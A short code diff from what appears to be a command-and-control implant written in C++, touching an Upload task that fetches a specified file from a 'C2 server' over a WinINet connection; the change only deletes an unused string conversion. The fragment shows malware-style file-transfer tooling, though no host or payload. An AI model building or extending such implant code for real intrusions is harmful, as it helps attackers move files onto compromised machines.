@@ -4,8 +4,6 @@ namespace Task
 {
     std::wstring Upload(HINTERNET hConnect, const std::wstring& wSrc, const std::wstring& wDest)
     {
-        std::string sSrc = Utils::Convert::UTF8Encode(wSrc);
-
         // Download a specified file from the C2 server.
         BOOL bResult = System::Http::DownloadFile(
             hConnect,
